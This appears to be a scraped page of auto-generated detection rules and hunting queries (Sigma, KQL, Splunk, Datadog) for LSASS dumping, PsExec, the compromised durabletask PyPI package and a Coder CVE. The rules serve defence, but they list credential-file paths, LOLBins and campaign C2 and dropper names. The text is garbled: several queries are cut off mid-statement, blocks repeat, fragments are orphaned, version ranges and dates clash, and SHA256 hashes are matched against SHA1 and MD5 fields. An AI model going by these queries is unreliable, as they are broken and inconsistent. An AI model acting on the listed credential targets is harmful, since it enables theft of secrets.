author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1003.001
    - attack.credential-access
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
    filter_known_good:
        SourceImage|endswith:
            - '\MsSense.exe'
            - '\MsMpEng.exe'
            - '\csrss.exe'
            - '\svchost.exe'
            - '\wininit.exe'
            - '\services.exe'
            - '\lsm.exe'
            - '\SearchProtocolHost.exe'
    condition: selection and not filter_known_good
falsepositives:
    - Third-party EDR / forensic tools — extend the filter list
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
Remote service execution — PsExec / SMB lateral movement Actions on Objectives High
psexec / paexec / smbexec / wmic /node — service install over SMB from remote host.
ATT&CKT1021.002 T1569.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents

| where AccountName !endswith "$"
| where FileName in~ ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
   or (FileName =~ "wmic.exe" and ProcessCommandLine has "/node:")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName

SecurityEvent

| where Account !endswith "$"
| where NewProcessName endswith "\psexec.exe"
   or NewProcessName endswith "\psexesvc.exe"
   or NewProcessName endswith "\paexec.exe"
   or (NewProcessName endswith "\wmic.exe" and CommandLine has "/node:")

status: experimental
description: |
    PsExec, paexec, smbexec, csexec, remcom — admin-grade tooling that

references:

Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

    spawning script-host or LOLBin children. Strongest signal when

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("ce7e4199506959fd7a71b64209b2c07b9c82e53a946aa7d78298dc9249230d01", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b", "2258284d65f63829bd67eaba01ef6f1ada2f593f9bbe41678b2df360bd90d3df") or SHA1 in~ ("ce7e4199506959fd7a71b64209b2c07b9c82e53a946aa7d78298dc9249230d01", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b", "2258284d65f63829bd67eaba01ef6f1ada2f593f9bbe41678b2df360bd90d3df") or MD5 in~ ("ce7e4199506959fd7a71b64209b2c07b9c82e53a946aa7d78298dc9249230d01", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b", "2258284d65f63829bd67eaba01ef6f1ada2f593f9bbe41678b2df360bd90d3df")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("ce7e4199506959fd7a71b64209b2c07b9c82e53a946aa7d78298dc9249230d01", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b", "2258284d65f63829bd67eaba01ef6f1ada2f593f9bbe41678b2df360bd90d3df") or SHA1 in~ ("ce7e4199506959fd7a71b64209b2c07b9c82e53a946aa7d78298dc9249230d01", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b", "2258284d65f63829bd67eaba01ef6f1ada2f593f9bbe41678b2df360bd90d3df") or MD5 in~ ("ce7e4199506959fd7a71b64209b2c07b9c82e53a946aa7d78298dc9249230d01", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b", "2258284d65f63829bd67eaba01ef6f1ada2f593f9bbe41678b2df360bd90d3df")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["ce7e4199506959fd7a71b64209b2c07b9c82e53a946aa7d78298dc9249230d01", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b", "2258284d65f63829bd67eaba01ef6f1ada2f593f9bbe41678b2df360bd90d3df"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-45498")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`

| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime

[LLM] Compromised Microsoft durabletask PyPI Package Install (TeamPCP 1.4.1-1.4.3) Delivery High
Detects pip/python installing the TeamPCP-compromised durabletask versions (1.4.0-1.4.3) — Microsoft's Durable Task Python SDK was published with a malicious dropper that fetches rope.pyz. Article-specific because it pins the exact package + version range named in the campaign. Rationale: Anchors on the exact package name 'durabletask' and version range from the article's code blocks plus external corroboration (Wiz, safedep, Aikido confirmed 1.4.1-1.4.3 as the malicious versions published 2026-05-19). pip+package-name+specific-version is high-fidelity — there is no legitimate reason to pin those exact malicious versions. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://www.stepsecurity.io/blog/microsofts-durabletask-pypi-package-compromised-in-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/ • https://www.aikido.dev/blog/durabletask-package-compromised-mini-shai-hulud
ATT&CKT1195.002 T1059.006

[LLM] TeamPCP rope.pyz Dropper Fetch from check.git-service.com C2 Command & Control High
Detects DNS, HTTP, or direct-IP egress to the TeamPCP C2 infrastructure that hosts the durabletask second-stage dropper (rope.pyz). Article-specific because it pins the exact filename and the campaign's named C2 domains. Rationale: Uses the exact payload filename 'rope.pyz' from article code-block 3 and the campaign C2 domain check.git-service.com confirmed by Wiz, safedep, and Aikido. No legitimate developer infrastructure resolves these domains — they were registered 2026-05-16 by the actor and have no clean use case. [LLM] TeamPCP rope.pyz Dropper Infection Markers on Linux Installation High
Detects creation of TeamPCP's on-disk artifacts from the durabletask compromise: the rope.pyz / managed.pyz dropper payloads in /tmp/ and the ~/.cache/.sys-update-check infection marker. Article-specific because rope.pyz is named verbatim in code block 3. Rationale: Anchors on the verbatim 'rope.pyz' filename from article code block 3, plus the marker files /tmp/managed.pyz and ~/.cache/.sys-update-check confirmed by Wiz, safedep, and Aikido as the dropper's on-disk artifacts. None of these paths/filenames have legitimate Linux usage — they are unique to this campaign. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/ • https://www.aikido.dev/blog/durabletask-package-compromised-mini-shai-hulud
ATT&CKT1105 T1036.005

    or (FolderPath has "/.cache/" and FileName in~ (".sys-update-check",".sys-update-check-k8s"))
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath, FileName, SHA256, FileSize

ImFileEvent

[LLM] AWS SSM SendCommand Fan-out from EC2 Instance Role (TeamPCP Worm Propagation) Actions on Objectives Medium
Detects the durabletask worm's lateral-movement stage: a single EC2-instance IAM role calling ssm:SendCommand against multiple EC2 instances within a short window. The rope.pyz worm uses stolen instance-role credentials to push itself to peer instances via SSM RunCommand. Rationale: Captures the worm's worm-stage primitive (ssm:SendCommand from an instance role to peer instances) which Wiz and safedep flagged as the AWS-specific propagation method. CloudTrail-only — Defender XDR and Falcon FDR don't ingest AWS control-plane events, hence empty defender_kql / falcon_logscale_query. Sentinel has the AWSCloudTrail connector but the table isn't in our canonical schema, so left empty rather than guess column names. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/
ATT&CKT1021.007 T1651 T1078.004
Data sourcesChange.All_Changes
source:cloudtrail @evt.name:SendCommand @userIdentity.type:AssumedRole @requestParameters.instanceIds:* (-@userAgent:(*aws-cli/* AND *root/*) AND -@userIdentity.sessionContext.sessionIssuer.userName:(*ssm-automation* OR *patch-manager* OR *config-rule*))
CLOUD
`cloudtrail` eventName=SendCommand eventSource="ssm.amazonaws.com" "userIdentity.type"="AssumedRole" 
| eval source_role=mvindex(split('userIdentity.sessionContext.sessionIssuer.arn',"/"),-1)
| eval target_count=mvcount('requestParameters.instanceIds{}')
| stats latest(_time) as last_seen dc('requestParameters.instanceIds{}') as DistinctTargets values('requestParameters.instanceIds{}') as Targets values(sourceIPAddress) as SourceIPs values(userAgent) as UAs by source_role 'userIdentity.arn' awsRegion
| where DistinctTargets >= 3 OR like(source_role, "%ec2%") OR like(source_role, "%-instance-%")
| sort 0 -last_seen
[LLM] Python Process Reading Multi-Cloud Credential Stores (durabletask Stealer Stage) Actions on Objectives Medium
Detects a single Python process opening credential files from THREE OR MORE distinct cloud/dev ecosystems within a 5-minute window — the signature behaviour of the rope.pyz multi-cloud stealer that harvests AWS, Azure, GCP, Kubernetes, npm, GitHub, Docker, and SSH secrets in one pass. Rationale: Targets the rope.pyz second-stage behaviour that Wiz and safedep documented: a single python process enumerating credentials across AWS + Azure + GCP + Kubernetes + npm + GitHub + Docker + SSH within seconds. The DistinctSecretFamilies>=3 threshold eliminates legitimate cloud SDKs that touch one ecosystem at a time while still catching the multi-cloud stealer in a single hit. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/ • https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-teampcp-supply-chain-campaign/
ATT&CKT1552.001 T1555.005 T1528
Data sourcesEndpoint.Filesystem
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType in ("FileOpened","FileCreated","FileRenamed")
| where InitiatingProcessFileName in~ ("python","python3","python3.10","python3.11","python3.12")
| extend SecretFamily = case(
    FolderPath has "/.aws/","aws",
    FolderPath has "/.azure/","azure",
    FolderPath has "/.config/gcloud/","gcp",
    FolderPath has "/.kube/","k8s",
    FolderPath has "/.docker/","docker",
    FileName =~ ".npmrc","npm",
    FileName =~ ".git-credentials","git",
    FolderPath has "/.config/gh/" and FileName =~ "hosts.yml","gh",
    FolderPath has "/.ssh/" and FileName startswith "id_","ssh",
    "other")
| where SecretFamily != "other"
| summarize DistinctSecretFamilies = dcount(SecretFamily), SecretFamilies = make_set(SecretFamily), PathSample = make_set(strcat(FolderPath,"/",FileName), 20), Cmd = any(InitiatingProcessCommandLine), arg_min(Timestamp, *) by DeviceName, InitiatingProcessAccountName, InitiatingProcessId, bin(Timestamp, 5m)
| where DistinctSecretFamilies >= 3
| where InitiatingProcessAccountName !endswith "$"
| order by Timestamp desc
ImFileEvent

| extend SecretFamily = case(

| where SecretFamily != "other"

| where DistinctSecretFamilies >= 3
| order by TimeGenerated desc
source:linux.auditd (@auditd.type:OPENAT OR @auditd.type:PATH) @process.executable.path:(*/python OR */python3 OR */python3.*) @file.path:(*/.aws/credentials OR */.aws/config OR */.azure/accessTokens.json OR */.azure/azureProfile.json OR */.config/gcloud/credentials.db OR */.config/gcloud/application_default_credentials.json OR */.kube/config OR */.npmrc OR */.docker/config.json OR */.git-credentials OR */.config/gh/hosts.yml OR */.ssh/id_*)

Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-46412")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-46412")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc
APPLICATION
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2026-46412")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2026-46412")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
OAuth consent / suspicious app grant Actions on Objectives High
Cloud identity abuse: app gets high-priv scopes, often via consent phishing.
ATT&CKT1528 T1098.001
Data sourcesAuthentication.Authentication CloudAppEvents
CloudAppEvents
| where Timestamp > ago(7d)
| where ActionType in ("Consent to application.","Add OAuth2PermissionGrant.","Add delegated permission grant.")
| project Timestamp, AccountObjectId, AccountDisplayName, ActivityType,
          ActivityObjects, IPAddress, UserAgent
// Entra ID directory audit — user / admin consent to a third-party app.
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName has "Consent to application"
| where Result =~ "success"
| extend AppName = tostring(parse_json(tostring(TargetResources))[0].displayName),

| project TimeGenerated, OperationName, User, AppName, AppId, Result
| order by TimeGenerated desc

Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca") or SHA1 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca") or MD5 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca") or SHA1 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca") or MD5 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Article-specific behavioural hunt — The AntV Supply Chain Campaign Expands: Microsoft's `durabletask` PyPI Package C Exploitation High
Auto-generated hunt targeting the specific binaries, paths, registry locations and command-line fragments named in this article. Hunting tier — needs analyst review and environment tuning before promotion to alerting.
ATT&CKT1204.002
Data sourcesEndpoint.Processes Endpoint.Filesystem Endpoint.Registry
// Article-specific bespoke detection — The AntV Supply Chain Campaign Expands: Microsoft's `durabletask` PyPI Package C
// Hunts the actual binaries / paths / commandline fragments named
// in the article instead of a generic technique-class template.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where (FileName in~ ("tanstack_runner.js", "router_init.js", "router_runtime.js"))
| project Timestamp, DeviceName, AccountName, FileName,
          FolderPath, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc

// File-creation events for the named binaries / paths
DeviceFileEvents

[LLM] Coder CVE-2026-46354 - Burst of azure-instance-identity POSTs (vmId enumeration / forged PKCS#7) Exploitation Medium
Detects multiple POST requests to the unauthenticated /api/v2/workspaceagents/azure-instance-identity endpoint from a single source within a short window — the signature of an attacker enumerating workspace vmId UUIDs to brute-force-redeem agent tokens via the forged PKCS#7 envelope flaw. A legitimate Coder workspace agent only registers once per VM lifetime, so >=5 POSTs to this exact path from one source in 10 minutes is anomalous. Rationale: The endpoint path is uniquely identified in the advisory as the unauthenticated PKCS#7 verification entry point. Burst-from-one-source on this specific path is the visible HTTP-layer shape of vmId UUID enumeration described in the article. Cross-checked Coder's public API docs at coder.com/docs/reference/api/agents to confirm the endpoint exists in legitimate v2 deployments. Defender Advanced Hunting has no native HTTP request log for self-hosted Coder, so defender_kql is intentionally empty. Falcon LogScale FDR does not ship application-layer HTTP request URLs from Coder, so falcon_logscale_query is also empty. Cross-checked against: • https://github.com/advisories/GHSA-6x44-w3xg-hqqf • https://coder.com/docs/reference/api/agents • https://github.com/coder/coder/pull/25286
ATT&CKT1190 T1133

ImWebSession

| where HttpMethod == "POST"
| where Url has "/api/v2/workspaceagents/azure-instance-identity"
| summarize Attempts = count(),
            Successes = countif(HttpStatusCode in ("200","204")),
            DistinctUserAgents = dcount(HttpRequestHeaderUserAgent),
            FirstSeen = min(TimeGenerated),
            LastSeen = max(TimeGenerated)
            by SrcIpAddr, DstHostname, bin(TimeGenerated, WindowMin)
| where Attempts >= Threshold
| order by Attempts desc

[LLM] Coder CVE-2026-46354 - Agent token redemption: PKCS#7 POST followed by gitsshkey / external-auth GET Actions on Objectives High
Correlates a POST to /api/v2/workspaceagents/azure-instance-identity with a GET to /workspaceagents/me/gitsshkey or /workspaceagents/me/external-auth from the same source IP within 30 minutes — the exact two-step attack flow the advisory documents (forge PKCS#7 envelope → use returned agent session token to pull Git SSH private key and OAuth credentials). This catches the credential-access stage even when a single vmId is targeted (UC1's burst signal misses). Rationale: The advisory explicitly chains POST /azure-instance-identity (token issuance) to GET /me/gitsshkey and GET /me/external-auth (credential read) as the documented post-exploit steps. Same-source-IP join with a 30-minute window captures the attacker round-trip while remaining tight enough to drop unrelated traffic. Endpoints confirmed in Coder's public API reference. Defender XDR lacks application HTTP logs for self-hosted Coder; Falcon FDR same — both left empty by design. Cross-checked against: • https://github.com/advisories/GHSA-6x44-w3xg-hqqf • https://coder.com/docs/reference/api/agents • https://coder.com/docs/admin/external-auth
ATT&CKT1528 T1552.004 T1190

[LLM] Coder CVE-2026-46354 - Inventory of vulnerable Coder v2 versions Reconnaissance High
Hygiene hunt: enumerate all hosts running an unpatched Coder v2 server using Defender TVM CVE data and surface those that are internet-facing first. The advisory lists six patched lines (v2.33.3 / v2.32.2 / v2.31.12 / v2.30.8 / v2.29.13 / v2.24.5); anything earlier on each line is exploitable without authentication. Pairs with UC1/UC2 to prioritise instances that need either immediate patching or a switch to token-based agent auth. Rationale: DeviceTvmSoftwareVulnerabilities is the canonical Defender table for CVE-based exposure tracking; pairing with DeviceInfo's IsInternetFacing flag surfaces the highest-risk hosts first. The CVE ID and patched-version list come directly from the GHSA advisory body. Datadog logs and Falcon FDR don't carry SBOM/CVE rollups in their standard log tables, so those fields are empty by design. Cross-checked against: • https://github.com/advisories/GHSA-6x44-w3xg-hqqf • https://github.com/coder/coder/pull/25286

[LLM] 9router unauthenticated RCE — POST /api/cli-tools/cowork-settings with customPlugins.command Exploitation High
